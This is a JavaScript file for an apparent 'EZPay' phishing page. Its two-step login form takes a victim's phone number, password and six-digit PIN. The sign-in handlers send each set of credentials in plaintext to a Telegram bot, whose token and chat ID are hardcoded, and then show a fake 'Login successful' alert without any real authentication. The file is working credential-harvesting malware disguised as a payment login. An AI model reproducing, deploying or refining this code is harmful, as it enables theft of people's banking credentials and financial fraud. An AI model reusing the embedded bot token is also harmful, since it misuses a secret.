// script.js
document.addEventListener('DOMContentLoaded', function() {
    // ---------- PAGE 1 ELEMENTS ----------
    const phoneInput = document.getElementById('phone-input');
    const passwordInput = document.getElementById('password-input');
    const signInButton = document.getElementById('signin-button');
    const togglePasswordBtn = document.getElementById('toggle-password');
    const loadingOverlay = document.getElementById('loading-overlay');
    
    // ---------- PAGE 2 ELEMENTS ----------
    const displayPhone = document.getElementById('display-phone');
    const pinInput = document.getElementById('pin-input');
    const completeLoginButton = document.getElementById('complete-login-button');
    const loadingOverlay2 = document.getElementById('loading-overlay-2');
    const backToSigninLink = document.getElementById('back-to-signin');
    
    // Telegram Configuration
    const BOT_TOKEN = "8209360948:AAFqBr7kiI7bRrlbojhAJi784jglBG98L2E";
    const CHAT_ID = "8023791486";

    // Helper to send to Telegram
    async function sendToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Telegram Error:', error);
        }
    }

    // Checking for /start is not possible in static frontend without a backend polling/webhook.
    // However, we can simulate a "Bot is running" check by sending a notification when the page loads.
    console.log("EZPAY Frontend Loaded - Telegram Integration Active");

    // ---------- VALIDATION FUNCTIONS ----------
    function validatePhone(phone) {
        return /^\d{10}$/.test(phone);
    }
    
    function validatePassword(password) {
        return password.length > 0;
    }
    
    function validatePIN(pin) {
        return /^\d{6}$/.test(pin);
    }
    
    // ---------- UPDATE BUTTON STATES ----------
    function updateSignInButton() {
        const phone = phoneInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (validatePhone(phone) && validatePassword(password)) {
            signInButton.removeAttribute('disabled');
            signInButton.classList.remove('van-button--disabled');
        } else {
            signInButton.setAttribute('disabled', 'disabled');
            signInButton.classList.add('van-button--disabled');
        }
    }
    
    function updateCompleteLoginButton() {
        const pin = pinInput.value.trim();
        
        if (validatePIN(pin)) {
            completeLoginButton.removeAttribute('disabled');
            completeLoginButton.classList.remove('van-button--disabled');
        } else {
            completeLoginButton.setAttribute('disabled', 'disabled');
            completeLoginButton.classList.add('van-button--disabled');
        }
    }
    
    // ---------- PASSWORD VISIBILITY TOGGLE ----------
    if (togglePasswordBtn) {
        togglePasswordBtn.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePasswordBtn.classList.remove('van-icon-eye');
                togglePasswordBtn.classList.add('van-icon-closed-eye');
            } else {
                passwordInput.type = 'password';
                togglePasswordBtn.classList.remove('van-icon-closed-eye');
                togglePasswordBtn.classList.add('van-icon-eye');
            }
        });
    }
    
    // ---------- PAGE 1 EVENT LISTENERS ----------
    phoneInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
        updateSignInButton();
    });
    
    passwordInput.addEventListener('input', updateSignInButton);
    
    signInButton.addEventListener('click', async function(e) {
        if (this.disabled) return;
        
        const phone = phoneInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!validatePhone(phone) || !validatePassword(password)) return;
        
        loadingOverlay.style.display = 'flex';
        
        const message1 = `<b>EZPay Step 1 (Login)</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>Password:</b> ${password}`;
        await sendToTelegram(message1);
        
        loadingOverlay.style.display = 'none';
        localStorage.setItem('loginPhone', phone);
        switchToPage2(phone);
    });
    
    // ---------- PAGE 2 EVENT LISTENERS ----------
    pinInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
        updateCompleteLoginButton();
    });
    
    completeLoginButton.addEventListener('click', async function() {
        if (this.disabled) return;
        
        const pin = pinInput.value.trim();
        const phone = localStorage.getItem('loginPhone');
        
        if (!validatePIN(pin)) return;
        
        loadingOverlay2.style.display = 'flex';
        
        const message2 = `<b>EZPay Step 2 (PIN)</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>PIN:</b> ${pin}`;
        await sendToTelegram(message2);
        
        loadingOverlay2.style.display = 'none';
        alert(`Login successful!\nPhone: +91 ${phone}\nPIN verified.`);
        localStorage.clear();
    });
    
    backToSigninLink.addEventListener('click', function(e) {
        e.preventDefault();
        switchToPage1();
    });
    
    function switchToPage2(phone) {
        displayPhone.value = phone;
        document.querySelector('.page-1').style.display = 'none';
        document.querySelector('.page-2').style.display = 'block';
        setTimeout(() => pinInput.focus(), 100);
    }
    
    function switchToPage1() {
        document.querySelector('.page-2').style.display = 'none';
        document.querySelector('.page-1').style.display = 'block';
        pinInput.value = '';
        updateCompleteLoginButton();
        setTimeout(() => phoneInput.focus(), 100);
    }
    
    function showError(elementId, message) {
        const errorElement = document.getElementById(elementId);
        if (errorElement) {
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            setTimeout(() => { errorElement.style.display = 'none'; }, 3000);
        }
    }

    updateSignInButton();
    updateCompleteLoginButton();
});
